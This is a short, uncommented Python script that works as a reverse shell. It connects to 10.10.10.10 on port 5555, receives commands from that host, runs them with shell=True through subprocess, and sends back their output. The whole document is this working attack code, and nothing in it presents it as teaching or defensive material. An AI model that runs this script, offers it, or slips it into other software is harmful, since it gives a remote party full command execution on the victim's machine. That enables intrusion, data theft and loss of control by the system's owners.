import socket, subprocess

s = socket.socket()
s.connect(('10.10.10.10', 5555))
while True:
    try:
        cmd = s.recv(1024).decode().strip()
        if not cmd:
            break
        output = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    except (ConnectionResetError, BrokenPipeError, OSError):
        break
s.close()
